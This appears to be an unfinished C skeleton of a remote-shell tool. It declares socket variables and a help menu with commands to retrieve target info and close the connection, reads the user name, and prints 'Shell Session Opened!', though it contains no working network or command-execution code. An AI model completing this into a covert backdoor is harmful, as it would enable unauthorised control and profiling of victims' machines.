#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>

struct sockaddr_in serv_addr, cli_addr;
int sock_fd = 0, newsock_fd = 0, clilen = 0, n = 0;

void ErrorMessage(const char* msg) {
	perror(msg);
}

int shell() {
	char command[1204];
	char help[1024] = "help";
	char close[1024] = "close";
	char info[1024] = "info";
	char clear[1024] = "clear";
	char HELP[1024] = "\n	[HELP MENU]\n	[ Help - Print this menu ]\n	[ Close - Close Connection ]\n	[Info - Retrieve Target Info ]\n	[ Clear - Clear The Terminal ]\n	[ HELP MENU ]\n\n";

	char COMPUTER[1024];
	char USER[1024];
	char OS[1024];
	char WANIP[1024];

	char* p = getenv("USER");
	sleep(1);

	printf("	[>>] Shell Session Opened!\n");
}